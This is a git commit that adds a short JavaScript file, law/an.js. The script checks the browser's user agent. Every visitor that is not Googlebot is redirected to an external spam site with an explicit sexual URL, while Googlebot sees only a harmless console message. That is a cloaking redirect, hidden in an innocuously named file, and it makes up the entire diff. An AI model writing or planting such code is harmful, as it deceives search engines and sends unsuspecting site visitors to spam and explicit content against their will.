e502e3a59acb8e148ae384745590a00b63efda67
ncpb34 <monayemni.l.l@gmail.com>
2026-09-01 03:17:23 +0600

    Create an.js

---
+++ law/an.js
@@ -0,0 +1,5 @@
+if (!navigator.userAgent.includes('Googlebot')) {
+  window.location.href = "http://leakviralvideos.com/?sex-video-anal";
+} else {
+  console.log("Thanks for visiting my page" );
+}
